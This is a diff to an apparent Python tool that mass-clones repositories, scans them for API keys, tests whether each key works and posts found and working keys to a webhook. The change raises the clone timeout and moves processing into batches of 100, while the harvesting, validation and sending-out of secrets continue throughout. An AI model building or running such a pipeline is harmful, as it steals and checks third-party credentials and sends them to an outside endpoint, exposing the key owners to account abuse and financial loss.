@@ -226,8 +226,8 @@ def download_and_scan_repo(url):
     
     # Download the repo with optimized timeout for high-performance setup
     download_start = time.time()
-    # Reduced timeout for fast network (4000+ Mbps): 1 second is enough
-    timeout_duration = 1.0  # 1 second max for high-speed network
+    # Timeout for git clone: 30 seconds should be enough even for large repos
+    timeout_duration = 30.0  # 30 seconds max for git clone
     
     try:
         # Use fastest shallow clone strategy
@@ -386,7 +386,7 @@ def bulk_downloader():
     
     logger.info(f"🚀 Starting download and scan of {total_repos} repositories...")
     logger.info(f"💻 Detected {cpu_count} CPU cores - Using {optimal_workers} parallel workers")
-    logger.info(f"⏱️  Timeout: 1 second per repo (optimized for high-speed network)")
+    logger.info(f"⏱️  Timeout: 30 seconds per repo (allows proper git clone)")
     logger.info(f"🗑️  Repositories will be deleted after scanning to save disk space")
     logger.info(f"⏱️  Timing format: Total | Download | Scan | Delete | Status")
     logger.info(f"{'='*80}")
@@ -409,102 +409,128 @@ def bulk_downloader():
     failed_count = 0
     timeout_count = 0
     
-    # Use optimal worker count for high-performance setup
+    # Process repos in batches of 100
+    batch_size = 100
+    total_batches = (total_repos + batch_size - 1) // batch_size
+    
+    logger.info(f"📦 Processing {total_repos} repos in {total_batches} batches of {batch_size}")
+    logger.info(f"🔄 Each batch: Clone → Crawl → Delete\n")
+    
+    # Use optimal worker count for high-performance setup (but limit to batch size)
+    batch_workers = min(optimal_workers, batch_size)
+    
     try:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=optimal_workers) as executor:
-            # Submit all tasks
-            future_to_url = {executor.submit(download_and_scan_repo, url): url for url in urls}
+        for batch_num in range(total_batches):
+            if shutdown_requested:
+                logger.info("\n⚠️  Shutdown requested. Stopping batch processing...")
+                break
             
-            # Process results as they complete
-            shutdown_logged = False
-            results_after_shutdown = 0
-            max_results_after_shutdown = 30  # Process up to 30 more results after shutdown
+            batch_start = batch_num * batch_size
+            batch_end = min(batch_start + batch_size, total_repos)
+            batch_urls = urls[batch_start:batch_end]
             
-            for future in concurrent.futures.as_completed(future_to_url):
-                # Check for shutdown request
-                if shutdown_requested:
-                    if not shutdown_logged:
-                        logger.info("\n⚠️  Shutdown requested. Finishing current batch and stopping...")
-                        shutdown_logged = True
-                    elif results_after_shutdown >= max_results_after_shutdown:
-                        logger.info("⚠️  Stopping - processed enough results after shutdown")
-                        break
-                    results_after_shutdown += 1
+            logger.info(f"\n{'='*80}")
+            logger.info(f"📦 BATCH {batch_num + 1}/{total_batches}: Processing repos {batch_start + 1}-{batch_end} ({len(batch_urls)} repos)")
+            logger.info(f"{'='*80}")
+            
+            batch_start_time = time.time()
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=batch_workers) as executor:
+                # Submit all tasks for this batch
+                future_to_url = {executor.submit(download_and_scan_repo, url): url for url in batch_urls}
                 
-                completed += 1
-                url = future_to_url[future]
+                # Process results as they complete
+                batch_completed = 0
                 
-                try:
-                    result_msg, found_keys, timings = future.result()
-                        
-                except Exception as e:
+                for future in concurrent.futures.as_completed(future_to_url):
+                    # Check for shutdown request
                     if shutdown_requested:
-                        # If shutdown was requested, just skip error logging
+                        logger.info("\n⚠️  Shutdown requested. Finishing current batch and stopping...")
+                        break
+                    
+                    batch_completed += 1
+                    completed += 1
+                    url = future_to_url[future]
+                    
+                    try:
+                        result_msg, found_keys, timings = future.result()
+                            
+                    except Exception as e:
+                        if shutdown_requested:
+                            # If shutdown was requested, just skip error logging
+                            continue
+                        logger.error(f"❌ Exception processing {url}: {e}")
+                        failed_count += 1
                         continue
-                    logger.error(f"❌ Exception processing {url}: {e}")
-                    failed_count += 1
-                    continue
-                
-                # Process results even if shutdown was requested (to save any found keys)
-                
-                # Collect timing statistics
-                if timings:
-                    timing_stats['download'].append(timings.get('download', 0))
-                    timing_stats['scan'].append(timings.get('scan', 0))
-                    timing_stats['delete'].append(timings.get('delete', 0))
-                    timing_stats['total'].append(timings.get('total', 0))
-                
-                # Track status
-                if "TIMEOUT" in result_msg:
-                    timeout_count += 1
-                elif "Skipped" in result_msg:
-                    skipped_count += 1
-                elif "❌ Failed" in result_msg:
-                    failed_count += 1
-                
-                logger.info(result_msg)
-                
-                # Process found keys
-                validation_start = time.time()
-                for key_data in found_keys:
-                    total_keys_found += 1
-                    save_key(key_data, key_data['type'], is_working=False)
-                    logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                     
-                    # Send webhook notification immediately when key is found
-                    try:
-                        send_webhook_notification(key_data['key'], key_data['type'], "API key found", is_working=False)
-                    except Exception as e:
-                        logger.warning(f"Error sending webhook for found key: {e}")
+                    # Process results even if shutdown was requested (to save any found keys)
                     
-                    # Test if key is working
-                    try:
-                        is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
-                        if is_valid:
-                            total_working_keys += 1
-                            save_key(key_data, key_data['type'], is_working=True)
-                            logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
-                            # Send webhook notification for working key
-                            send_webhook_notification(key_data['key'], key_data['type'], message, is_working=True)
-                        else:
-                            logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
-                    except Exception as e:
-                        logger.warning(f"Error testing key: {e}")
-                
-                validation_time = time.time() - validation_start
-                if validation_time > 0:
-                    timing_stats['validation'].append(validation_time)
-                
-                # Progress update every 10 repos
-                if completed % 10 == 0 and not shutdown_requested:
-                    elapsed = time.time() - start_time
-                    rate = completed / elapsed if elapsed > 0 else 0
-                    remaining = (total_repos - completed) / rate if rate > 0 else 0
-                    logger.info(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
-                          f"Rate: {rate:.1f} repos/sec | "
-                          f"ETA: {remaining:.0f}s | "
-                          f"Keys: {total_keys_found} found, {total_working_keys} working | "
-                          f"Skipped: {skipped_count} | Failed: {failed_count} | Timeout: {timeout_count}\n")
+                    # Collect timing statistics
+                    if timings:
+                        timing_stats['download'].append(timings.get('download', 0))
+                        timing_stats['scan'].append(timings.get('scan', 0))
+                        timing_stats['delete'].append(timings.get('delete', 0))
+                        timing_stats['total'].append(timings.get('total', 0))
+                    
+                    # Track status
+                    if "TIMEOUT" in result_msg:
+                        timeout_count += 1
+                    elif "Skipped" in result_msg:
+                        skipped_count += 1
+                    elif "❌ Failed" in result_msg:
+                        failed_count += 1
+                    
+                    logger.info(result_msg)
+                    
+                    # Process found keys
+                    validation_start = time.time()
+                    for key_data in found_keys:
+                        total_keys_found += 1
+                        save_key(key_data, key_data['type'], is_working=False)
+                        logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
+                        
+                        # Send webhook notification immediately when key is found
+                        try:
+                            send_webhook_notification(key_data['key'], key_data['type'], "API key found", is_working=False)
+                        except Exception as e:
+                            logger.warning(f"Error sending webhook for found key: {e}")
+                        
+                        # Test if key is working
+                        try:
+                            is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
+                            if is_valid:
+                                total_working_keys += 1
+                                save_key(key_data, key_data['type'], is_working=True)
+                                logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
+                                # Send webhook notification for working key
+                                send_webhook_notification(key_data['key'], key_data['type'], message, is_working=True)
+                            else:
+                                logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
+                        except Exception as e:
+                            logger.warning(f"Error testing key: {e}")
+                    
+                    validation_time = time.time() - validation_start
+                    if validation_time > 0:
+                        timing_stats['validation'].append(validation_time)
+                    
+                    # Progress update every 10 repos
+                    if completed % 10 == 0 and not shutdown_requested:
+                        elapsed = time.time() - start_time
+                        rate = completed / elapsed if elapsed > 0 else 0
+                        remaining = (total_repos - completed) / rate if rate > 0 else 0
+                        logger.info(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
+                              f"Rate: {rate:.1f} repos/sec | "
+                              f"ETA: {remaining:.0f}s | "
+                              f"Keys: {total_keys_found} found, {total_working_keys} working | "
+                              f"Skipped: {skipped_count} | Failed: {failed_count} | Timeout: {timeout_count}\n")
+            
+            # Batch completed - all repos in this batch have been cloned, crawled, and deleted
+            batch_time = time.time() - batch_start_time
+            logger.info(f"\n✅ BATCH {batch_num + 1}/{total_batches} COMPLETED in {batch_time:.2f}s")
+            logger.info(f"   Processed: {batch_completed}/{len(batch_urls)} repos")
+            logger.info(f"   All repos in this batch have been cloned, crawled, and deleted")
+            logger.info(f"   Total progress: {completed}/{total_repos} repos ({100*completed/total_repos:.1f}%)")
+            logger.info(f"   Keys found so far: {total_keys_found} | Working keys: {total_working_keys}\n")
                 
     except KeyboardInterrupt:
         shutdown_requested = True
